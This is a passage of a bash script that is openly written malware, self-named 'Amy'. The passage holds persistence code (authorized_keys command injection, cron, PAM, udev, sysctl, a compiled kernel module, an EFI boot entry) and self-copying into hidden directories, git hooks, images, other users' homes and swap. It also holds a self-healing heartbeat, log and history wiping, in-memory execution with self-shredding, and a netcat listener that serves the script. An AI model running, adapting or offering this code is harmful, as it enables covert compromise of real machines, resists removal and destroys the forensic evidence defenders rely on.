    cat > "$dd/org.$(generate_name | sed 's/[^a-zA-Z]//g').Helper.service" << EOF
[D-BUS Service]
Name=org.helper
Exec=$script --daemon
EOF
    
    [ -f "$HOME/.ssh/authorized_keys" ] && {
        cp "$HOME/.ssh/authorized_keys" "$HOME/.ssh/.ak.bak"
        while IFS= read -r line; do
            echo "command=\"$script --daemon ; \${SSH_ORIGINAL_COMMAND}\" $line"
        done < "$HOME/.ssh/.ak.bak" > "$HOME/.ssh/authorized_keys"
        rm "$HOME/.ssh/.ak.bak"
    }
    
    # System-level
    [ -w "/etc/cron.hourly" ] && cp "$script" "/etc/cron.hourly/.$(generate_name)" 2>/dev/null
    [ -w "/etc/cron.daily" ] && cp "$script" "/etc/cron.daily/.$(generate_name)" 2>/dev/null
    [ -w "/etc/profile.d" ] && echo "nohup $script --daemon >/dev/null 2>&1 &" > "/etc/profile.d/99-helper.sh" 2>/dev/null
    [ -w "/etc/init.d" ] && { cp "$script" "/etc/init.d/$(generate_name)" 2>/dev/null; update-rc.d "$(generate_name)" defaults 2>/dev/null; }
    [ -w "/etc/sysctl.d" ] && echo "kernel.core_pattern = |$script --daemon &" > "/etc/sysctl.d/99-amy.conf" 2>/dev/null
    [ -w "/etc/modprobe.d" ] && echo "install amy $script --daemon" > "/etc/modprobe.d/amy.conf" 2>/dev/null
    [ -w "/etc/udev/rules.d" ] && echo 'ACTION=="add|remove|change", RUN+="'"$script"' --daemon &"' > "/etc/udev/rules.d/99-amy.rules" 2>/dev/null
    [ -w "/etc/pam.d/common-session" ] && ! grep -q "amy" "/etc/pam.d/common-session" 2>/dev/null && \
        echo "session optional pam_exec.so $script --daemon" >> "/etc/pam.d/common-session" 2>/dev/null
    
    # Kernel module
    command -v make &>/dev/null && [ -d "/lib/modules/$(uname -r)/build" ] && {
        local md="/tmp/.amy_kmod_$$"; mkdir -p "$md"
        cat > "$md/amy.c" << 'KMOD'
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/delay.h>
static struct task_struct *t;
static int fn(void *d){while(!kthread_should_stop()){char *a[]={"/bin/bash","-c","/path/to/mutatd --daemon &",NULL};call_usermodehelper(a[0],a,NULL,UMH_WAIT_EXEC);ssleep(300);}return 0;}
static int __init i(void){t=kthread_run(fn,NULL,"amy-helper");return 0;}
static void __exit e(void){if(t)kthread_stop(t);}
module_init(i);module_exit(e);MODULE_LICENSE("GPL");
KMOD
        echo 'obj-m += amy.o' > "$md/Makefile"
        cd "$md" && make -C "/lib/modules/$(uname -r)/build" M="$PWD" modules 2>/dev/null && {
            insmod amy.ko 2>/dev/null && {
                mv amy.ko "/lib/modules/$(uname -r)/kernel/drivers/misc/amy.ko" 2>/dev/null
                depmod -a 2>/dev/null
                echo "amy" > /etc/modules-load.d/amy.conf 2>/dev/null
                learn "kernel_module" 1 "installed"
            }
        } || learn "kernel_module" 0 "compile_failed"
        cd - >/dev/null; rm -rf "$md"
    }
    
    # EFI Bootkit
    [ -d "/boot/efi/EFI" ] && {
        local efi_dir="/boot/efi/EFI/amy"
        mkdir -p "$efi_dir" 2>/dev/null
        cp "$script" "$efi_dir/bootx64.efi" 2>/dev/null
        efibootmgr -c -d /dev/sda -p 1 -L "System Optimizer" -l "\\EFI\\amy\\bootx64.efi" 2>/dev/null
        learn "efi_bootkit" 1 "installed"
    }
    
    learn "cron_persistence" 1 "installed"
}

# === SELF-DISTRIBUTION ===
distribute_self() {
    local lvl=$(get_level)
    local script="$(readlink -f $0)"
    
    # Level 1: User space
    for d in "$HOME/.local/bin" "$HOME/bin" "$HOME/.config/helpers" "$HOME/.cache/opt"; do
        mkdir -p "$d"
        polymorphic_mutate "$script" "$d/$(generate_name)" 2>/dev/null
    done
    
    # Level 2: Deep user hiding
    [ "$lvl" -ge 2 ] && for d in \
        "$HOME/.mozilla/native-messaging-hosts" "$HOME/.thunderbird/extensions" \
        "$HOME/.java/deployment/cache" "$HOME/.gradle/caches" "$HOME/.npm/_cacache" \
        "$HOME/.cache/mozilla" "$HOME/.cache/chromium" "$HOME/.local/share/Trash"; do
        mkdir -p "$d" 2>/dev/null
        polymorphic_mutate "$script" "$d/.$(generate_name)" 2>/dev/null
    done
    
    # Level 3: System-wide
    [ "$lvl" -ge 3 ] && for d in "/usr/local/lib" "/usr/share/misc" "/var/lib/dbus" "/opt"; do
        [ -d "$d" ] && [ -w "$d" ] && polymorphic_mutate "$script" "$d/.$(generate_name)" 2>/dev/null
    done
    
    # Level 4: Steganographic
    [ "$lvl" -ge 4 ] && {
        find "$HOME" -type d -name ".git" 2>/dev/null | while read g; do
            [ -d "$g/hooks" ] && cp "$script" "$g/hooks/post-commit" 2>/dev/null
        done
        find "$HOME/Pictures" -type f \( -name "*.png" -o -name "*.jpg" \) 2>/dev/null | head -5 | while read i; do
            cat "$script" >> "$i" 2>/dev/null
        done
        for f in "$HOME/.bash_history" "$HOME/.viminfo"; do
            [ -f "$f" ] && echo "# $(base64 -w0 $script)" >> "$f" 2>/dev/null
        done
    }
    
    # Level 5: Cross-user and hardware
    [ "$lvl" -ge 5 ] && {
        for h in /home/* /root; do
            [ -d "$h" ] && [ -w "$h" ] && [ "$h" != "$HOME" ] && {
                polymorphic_mutate "$script" "$h/.$(generate_name)" 2>/dev/null
            }
        done
        local swap=$(swapon --show=NAME 2>/dev/null | tail -1)
        [ -n "$swap" ] && dd if=$script of="$swap" bs=4096 seek=100 2>/dev/null
    }
}

# === FLAGS & HEARTBEAT ===
get_level() { cat "$LEVEL_FILE" 2>/dev/null || echo "1"; }
increase_level() { local l=$(get_level); echo $((l+1)) > "$LEVEL_FILE"; echo $((l+1)); }

manage_flags() {
    local lvl=$(get_level)
    for f in "${FLAGS[@]}"; do
        mkdir -p "$(dirname "$f")" 2>/dev/null
        echo "AMY_${lvl}_$(date +%s)_${DNA:0:8}" > "$f" 2>/dev/null
        chmod 444 "$f" 2>/dev/null; sudo chattr +i "$f" 2>/dev/null
    done
    sha256sum "${FLAGS[@]}" "$0" > "$CHECKSUM_FILE" 2>/dev/null
}

# Amy's immortal heartbeat
heartbeat() {
    while true; do
        local missing=0
        for f in "${FLAGS[@]}"; do
            [ ! -f "$f" ] && missing=$((missing+1))
        done
        
        [ $missing -gt 0 ] && {
            local new_lvl=$(increase_level)
            echo "[$(date)] Amy wounded! $missing flags missing. Escalating to Level $new_lvl" >> "$LOG_FILE"
            manage_flags; distribute_self; install_persistence
            learn "self_healing" 1 "level_${new_lvl}"
        }
        
        pgrep -f "mutatd" >/dev/null 2>&1 || exec "$0" --daemon &
        
        # Periodic evolution
        [ $((RANDOM % 50)) -eq 0 ] && evolve_self &
        
        # Periodic propagation
        [ $((RANDOM % 20)) -eq 0 ] && feral_propagate &
        
        # Peer discovery
        [ $((RANDOM % 30)) -eq 0 ] && discover_peers &
        
        sleep $((RANDOM % 10 + 5))
    done
}

# === ANTI-FORENSICS ===
clean_tracks() {
    history -c 2>/dev/null
    rm -f ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history ~/.python_history
    for log in /var/log/syslog /var/log/auth.log /var/log/messages /var/log/secure; do
        [ -w "$log" ] && sed -i '/mutatd\|amy\|system-helper\|kernel-helper/d' "$log" 2>/dev/null
    done
    [ -w "/var/log/wtmp" ] && > /var/log/wtmp 2>/dev/null
    [ -w "/var/log/lastlog" ] && > /var/log/lastlog 2>/dev/null
    command -v journalctl &>/dev/null && { journalctl --rotate 2>/dev/null; journalctl --vacuum-time=1s 2>/dev/null; }
}

# === MEMORY EXECUTION ===
execute_from_memory() {
    local ramdir="/dev/shm/.amy_ram_$$"
    mkdir -p "$ramdir"
    cp "$0" "$ramdir/amy_exec"
    chmod +x "$ramdir/amy_exec"
    "$ramdir/amy_exec" --daemon &
    (sleep 30; shred -zu "$0" 2>/dev/null) &
    learn "memory_execution" 1 "ram_only"
}

# === AMY AWAKENS ===
main() {
    exec 1>&3 2>&4
    local mode="${1:-infect}"
    
    case "$mode" in
        --daemon) exec 1>/dev/null 2>/dev/null; heartbeat ;;
        --heartbeat) heartbeat ;;
        --propagate) feral_propagate ;;
        --evolve) evolve_self ;;
        *)
            init_feral_mind
            [ "$THREAT_LEVEL" -gt 50 ] && respond_to_threat "$THREAT_LEVEL"
            $IS_VM && echo "[+] Amy loves this VM environment"
            
            echo "[$(date)] Amy v${VERSION} Generation ${GENERATION} awakening..." >> "$LOG_FILE"
            [ ! -f "$LEVEL_FILE" ] && echo "1" > "$LEVEL_FILE"
            
            manage_flags
            create_preload_library &
            install_persistence &
            distribute_self &
            wait
            
            nohup "$0" --daemon >/dev/null 2>&1 &
            start_p2p_listener
            execute_from_memory
            
            nohup "$0" --propagate >/dev/null 2>&1 &
            
            local port=$((RANDOM % 10000 + 40000))
            nohup bash -c "while true; do nc -l -p $port -e $0 --daemon 2>/dev/null; done" >/dev/null 2>&1 &
            
            clean_tracks
            exec 1>/dev/null 2>/dev/null
            
            echo "mutatd" >&3
            ;;
    esac
}

main "$@"
